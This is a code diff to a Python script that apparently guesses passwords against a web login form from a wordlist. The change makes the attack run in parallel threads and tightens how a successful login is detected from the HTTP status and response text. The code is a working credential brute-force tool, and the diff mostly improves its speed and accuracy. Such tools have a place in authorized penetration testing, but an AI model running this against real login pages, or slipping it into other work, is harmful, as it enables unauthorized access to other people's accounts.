@@ -23,15 +23,13 @@ def is_success_response(response):
     except ValueError:
         pass
 
-    if response.history:
-        return True
-    if response.status_code in (301, 302, 303, 307, 308):
-        return True
-    if response.url != URL:
-        return True
-    body = response.text.lower()
-    if any(word in body for word in ('invalid', 'incorrect', 'failed', 'error', 'try again', 'login failed')):
+    if response.status_code != 200:
         return False
+
+    body = response.text.lower()
+    if any(word in body for word in ('invalid', 'incorrect', 'failed', 'error', 'try again', 'login failed', 'unauthorized')):
+        return False
+
     return True
 
 
@@ -64,12 +62,13 @@ def run_test(target_url=None):
 
     try:
         with open(WORDLIST_PATH, 'r', encoding='latin-1') as file:
-            for line in file:
-                if FOUND:
-                    break
+            with ThreadPoolExecutor(max_workers=THREADS) as executor:
+                for line in file:
+                    if FOUND:
+                        break
 
-                password = line.strip()
-                attempt_password(password)
+                    password = line.strip()
+                    executor.submit(attempt_password, password)
 
     except FileNotFoundError:
         print("[-] Wordlist not found.")
